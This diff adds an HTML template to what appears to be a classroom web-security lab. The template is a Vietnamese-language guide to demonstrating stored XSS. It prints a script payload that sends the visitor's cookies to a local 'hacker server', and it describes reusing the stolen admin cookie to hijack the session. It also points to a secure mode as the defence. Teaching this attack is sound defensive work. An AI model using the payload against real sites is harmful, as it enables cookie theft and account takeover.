@@ -1,0 +1,32 @@
+{% extends 'base.html' %}
+{% block content %}
+<div class="card border-0 shadow-sm">
+    <div class="card-body p-4">
+        <h3 class="mb-3">Huong dan demo Stored XSS</h3>
+        <ol>
+            <li>Mo hacker server o <strong>http://127.0.0.1:5001</strong>.</li>
+            <li>Dang nhap user thuong hoac dang ky user moi.</li>
+            <li>Gui payload vao o comment:</li>
+        </ol>
+        <pre class="bg-dark text-light p-3 rounded"><code>&lt;script&gt;
+new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre>
+
+        <ol start="4">
+            <li>Mo trinh duyet/tab khac, dang nhap bang tai khoan admin.</li>
+            <li>Admin vao <strong>Dashboard</strong> va mo <strong>Quan ly comment</strong> de xem comment da gui.</li>
+            <li>Kiem tra hacker server hoac file <strong>hacker_cookies.txt</strong> de thay cookie bi ghi lai.</li>
+            <li>Gan cookie do vao trinh duyet khac de mo phong chiem session admin.</li>
+            <li>Chay secure mode de xem cach phong chong.</li>
+        </ol>
+
+        <hr>
+        <h5 class="mb-2">Chay secure mode</h5>
+        <p class="mb-1">Dung lenh:</p>
+        <pre class="bg-light p-3 rounded"><code>python app.py --secure</code></pre>
+        <p class="text-muted small mb-0">
+            Secure mode kich hoat output escaping + HttpOnly + CSP + input validation.
+        </p>
+    </div>
+</div>
+{% endblock %}
